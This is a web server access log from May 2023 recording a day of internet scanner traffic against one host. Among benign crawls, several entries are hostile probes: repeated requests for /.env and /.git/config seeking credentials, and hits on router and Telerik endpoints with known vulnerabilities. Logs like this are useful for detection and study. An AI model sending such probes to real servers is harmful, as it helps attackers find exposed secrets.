localhost:80 135.125.246.189 - - [01/May/2023:06:36:07 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 71.6.232.27 - - [01/May/2023:06:58:54 +0000] "GET / HTTP/1.1" 200 6286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
localhost:80 172.105.128.11 - - [01/May/2023:06:59:50 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 135.125.246.189 - - [01/May/2023:07:17:45 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:07:17:45 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 184.105.139.68 - - [01/May/2023:07:19:39 +0000] "GET / HTTP/1.1" 200 6288 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.46"
localhost:80 184.105.139.68 - - [01/May/2023:07:22:10 +0000] "GET /favicon.ico HTTP/1.1" 200 5676 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
localhost:80 184.105.139.68 - - [01/May/2023:07:23:25 +0000] "GET /geoserver/web/ HTTP/1.1" 301 455 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.46"
localhost:80 43.154.128.189 - - [01/May/2023:07:52:03 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 193.118.53.210 - - [01/May/2023:07:54:51 +0000] "GET / HTTP/1.1" 200 6287 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
localhost:80 178.128.172.166 - - [01/May/2023:07:58:23 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 178.128.172.166 - - [01/May/2023:07:58:23 +0000] "GET / HTTP/1.1" 200 6287 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
localhost:80 178.128.172.166 - - [01/May/2023:07:58:23 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 178.128.172.166 - - [01/May/2023:07:58:23 +0000] "GET / HTTP/1.1" 200 6287 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.0.54 (like Safari/604.1)"
localhost:80 178.128.172.166 - - [01/May/2023:07:58:23 +0000] "GET /favicon.ico HTTP/1.1" 200 5676 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
localhost:80 193.32.162.159 - - [01/May/2023:08:01:42 +0000] "GET / HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 95.214.27.51 - - [01/May/2023:08:02:18 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
localhost:80 95.214.27.51 - - [01/May/2023:08:02:19 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
localhost:80 45.79.181.251 - - [01/May/2023:09:03:45 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 135.125.246.189 - - [01/May/2023:09:10:10 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:09:10:10 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 43.154.128.189 - - [01/May/2023:09:10:35 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:10:04:48 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:10:04:48 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 94.102.56.151 - - [01/May/2023:10:23:51 +0000] "GET / HTTP/1.1" 200 22437 "-" "libwww-perl/6.61"
localhost:80 43.154.128.189 - - [01/May/2023:10:29:10 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 193.32.162.159 - - [01/May/2023:10:37:56 +0000] "GET / HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 172.104.11.51 - - [01/May/2023:10:56:50 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 13.57.201.123 - - [01/May/2023:11:05:22 +0000] "GET / HTTP/1.1" 200 6306 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
localhost:80 185.254.196.173 - - [01/May/2023:11:31:40 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 185.254.196.173 - - [01/May/2023:11:31:40 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 193.32.162.159 - - [01/May/2023:11:37:34 +0000] "GET / HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 43.154.128.189 - - [01/May/2023:11:47:37 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:12:10:44 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:12:10:44 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 194.55.224.203 - - [01/May/2023:12:24:03 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 2150 "http://54.155.101.2:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
localhost:80 217.150.78.122 - - [01/May/2023:12:37:07 +0000] "GET / HTTP/1.0" 200 22396 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
localhost:80 167.94.146.58 - - [01/May/2023:12:57:11 +0000] "GET / HTTP/1.1" 200 22418 "-" "-"
localhost:80 167.94.146.58 - - [01/May/2023:12:57:11 +0000] "GET / HTTP/1.1" 200 6288 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
localhost:80 167.94.146.58 - - [01/May/2023:12:57:11 +0000] "PRI * HTTP/2.0" 400 483 "-" "-"
localhost:80 167.94.146.58 - - [01/May/2023:12:57:12 +0000] "GET /favicon.ico HTTP/1.1" 200 5695 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
localhost:80 43.154.128.189 - - [01/May/2023:13:06:05 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 185.254.196.186 - - [01/May/2023:13:11:01 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 185.254.196.186 - - [01/May/2023:13:11:01 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 117.215.146.198 - - [01/May/2023:13:30:39 +0000] "GET / HTTP/1.1" 200 22418 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
localhost:80 87.121.221.49 - - [01/May/2023:13:34:19 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 2150 "http://54.155.101.2:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
localhost:80 135.125.246.189 - - [01/May/2023:13:58:24 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:13:58:24 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 43.154.128.189 - - [01/May/2023:14:25:41 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 66.175.213.4 - - [01/May/2023:15:20:30 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 135.125.246.189 - - [01/May/2023:15:30:15 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:15:30:15 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 38.110.46.2 - - [01/May/2023:15:34:06 +0000] "GET / HTTP/1.1" 200 6285 "-" "Mozilla/5.0 (X11; Linux i686; rv:110.0) Gecko/20100101 Firefox/110.0"
localhost:80 38.110.46.2 - - [01/May/2023:15:34:06 +0000] "GET / HTTP/1.1" 200 6286 "-" "Mozilla/5.0 (X11; Linux i686; rv:110.0) Gecko/20100101 Firefox/110.0"
localhost:80 199.45.154.4 - - [01/May/2023:15:34:08 +0000] "GET / HTTP/1.1" 200 6288 "-" "Mozilla/5.0 (X11; Linux i686; rv:110.0) Gecko/20100101 Firefox/110.0"
localhost:80 199.45.154.4 - - [01/May/2023:15:34:08 +0000] "GET / HTTP/1.1" 200 6288 "-" "Mozilla/5.0 (X11; Linux i686; rv:110.0) Gecko/20100101 Firefox/110.0"
localhost:80 199.45.155.4 - - [01/May/2023:15:34:11 +0000] "GET / HTTP/1.1" 200 6287 "-" "Mozilla/5.0 (X11; Linux i686; rv:110.0) Gecko/20100101 Firefox/110.0"
localhost:80 199.45.155.4 - - [01/May/2023:15:34:11 +0000] "GET / HTTP/1.1" 200 6287 "-" "Mozilla/5.0 (X11; Linux i686; rv:110.0) Gecko/20100101 Firefox/110.0"
localhost:80 171.67.71.144 - - [01/May/2023:15:34:13 +0000] "GET / HTTP/1.1" 200 6287 "-" "Mozilla/5.0 (X11; Linux i686; rv:110.0) Gecko/20100101 Firefox/110.0"
localhost:80 171.67.71.144 - - [01/May/2023:15:34:13 +0000] "GET / HTTP/1.1" 200 6288 "-" "Mozilla/5.0 (X11; Linux i686; rv:110.0) Gecko/20100101 Firefox/110.0"
localhost:80 43.248.128.82 - - [01/May/2023:15:34:20 +0000] "GET / HTTP/1.1" 200 6287 "-" "Mozilla/5.0 (X11; Linux i686; rv:110.0) Gecko/20100101 Firefox/110.0"
localhost:80 43.248.128.82 - - [01/May/2023:15:34:20 +0000] "GET / HTTP/1.1" 200 6287 "-" "Mozilla/5.0 (X11; Linux i686; rv:110.0) Gecko/20100101 Firefox/110.0"
localhost:80 193.32.162.159 - - [01/May/2023:15:37:33 +0000] "GET / HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 193.35.18.65 - - [01/May/2023:15:43:47 +0000] "GET / HTTP/1.1" 200 22418 "-" "-"
localhost:80 193.35.18.65 - - [01/May/2023:15:43:47 +0000] "POST /HNAP1/ HTTP/1.1" 301 495 "-" "Mozila/5.0"
localhost:80 43.154.128.189 - - [01/May/2023:15:45:41 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 15.204.170.11 - - [01/May/2023:15:59:33 +0000] "HEAD / HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
localhost:80 185.254.196.186 - - [01/May/2023:16:03:08 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 185.254.196.186 - - [01/May/2023:16:03:08 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:16:45:09 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:16:45:09 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 193.32.162.159 - - [01/May/2023:16:47:44 +0000] "GET / HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 43.154.128.189 - - [01/May/2023:17:05:41 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 172.105.128.13 - - [01/May/2023:17:06:06 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 15.188.118.5 - - [01/May/2023:17:36:58 +0000] "GET /.git HTTP/1.1" 404 226 "-" "Mozilla/5.0 (iPad; CPU OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML like Gecko) Mobile/12A405 Version/7.0 Safari/9537.53"
localhost:80 15.188.118.5 - - [01/May/2023:17:37:00 +0000] "GET /git HTTP/1.1" 404 226 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:17:40:57 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:17:40:57 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 193.32.162.159 - - [01/May/2023:17:43:24 +0000] "GET / HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 43.154.128.189 - - [01/May/2023:18:25:49 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 188.215.202.119 - - [01/May/2023:18:54:24 +0000] "GET / HTTP/1.1" 200 22418 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
localhost:80 198.235.24.35 - - [01/May/2023:19:16:53 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 162.216.150.192 - - [01/May/2023:19:34:29 +0000] "GET / HTTP/1.1" 200 22418 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
localhost:80 193.32.162.159 - - [01/May/2023:19:42:35 +0000] "GET / HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 43.154.128.189 - - [01/May/2023:19:46:17 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:20:02:01 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:20:02:01 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 205.210.31.161 - - [01/May/2023:20:46:37 +0000] "GET / HTTP/1.0" 200 22396 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
localhost:80 172.104.11.51 - - [01/May/2023:20:56:46 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 87.236.176.34 - - [01/May/2023:20:57:41 +0000] "GET / HTTP/1.1" 200 6306 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
localhost:80 43.154.128.189 - - [01/May/2023:21:05:17 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 193.118.53.210 - - [01/May/2023:21:05:20 +0000] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 404 226 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:21:12:53 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:21:12:53 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 95.214.27.80 - - [01/May/2023:21:27:36 +0000] "GET /.git/config HTTP/1.1" 404 282 "-" "python-requests/2.28.1"
localhost:80 198.235.24.226 - - [01/May/2023:21:32:55 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 162.243.150.9 - - [01/May/2023:22:14:30 +0000] "GET / HTTP/1.1" 200 6288 "-" "Mozilla/5.0 zgrab/0.x"
localhost:80 43.154.128.189 - - [01/May/2023:22:24:01 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:22:49:23 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:22:49:23 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 160.177.52.161 - - [01/May/2023:22:53:01 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
localhost:80 160.177.52.161 - - [01/May/2023:22:53:01 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
localhost:80 45.79.181.179 - - [01/May/2023:22:59:10 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 193.32.162.159 - - [01/May/2023:23:16:47 +0000] "GET / HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 43.154.128.189 - - [01/May/2023:23:42:23 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:23:47:47 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:23:47:47 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 94.102.61.80 - - [02/May/2023:00:05:34 +0000] "GET / HTTP/1.1" 200 6287 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
localhost:80 193.32.162.159 - - [02/May/2023:00:20:51 +0000] "GET / HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 198.235.24.39 - - [02/May/2023:00:29:56 +0000] "GET / HTTP/1.0" 200 22396 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
localhost:80 205.210.31.8 - - [02/May/2023:00:30:42 +0000] "GET / HTTP/1.1" 200 22418 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
localhost:80 185.142.236.41 - - [02/May/2023:00:44:12 +0000] "GET / HTTP/1.1" 200 22418 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
localhost:80 185.142.236.41 - - [02/May/2023:00:44:13 +0000] "GET /robots.txt HTTP/1.1" 200 253 "-" "-"
localhost:80 185.142.236.41 - - [02/May/2023:00:44:13 +0000] "GET /sitemap.xml HTTP/1.1" 404 226 "-" "-"
localhost:80 185.142.236.41 - - [02/May/2023:00:44:13 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 226 "-" "-"
localhost:80 185.142.236.41 - - [02/May/2023:00:44:15 +0000] "GET /favicon.ico HTTP/1.1" 200 5732 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
localhost:80 167.94.145.60 - - [02/May/2023:00:46:14 +0000] "GET / HTTP/1.1" 200 22418 "-" "-"
localhost:80 167.94.145.60 - - [02/May/2023:00:46:15 +0000] "GET / HTTP/1.1" 200 6287 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
localhost:80 167.94.145.60 - - [02/May/2023:00:46:15 +0000] "PRI * HTTP/2.0" 400 483 "-" "-"
localhost:80 167.94.145.60 - - [02/May/2023:00:46:15 +0000] "GET /favicon.ico HTTP/1.1" 200 5695 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
localhost:80 43.154.128.189 - - [02/May/2023:01:00:50 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 45.79.181.223 - - [02/May/2023:01:01:08 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 193.32.162.159 - - [02/May/2023:02:08:36 +0000] "GET / HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 135.125.246.189 - - [02/May/2023:02:18:16 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [02/May/2023:02:18:16 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 43.154.128.189 - - [02/May/2023:02:19:12 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
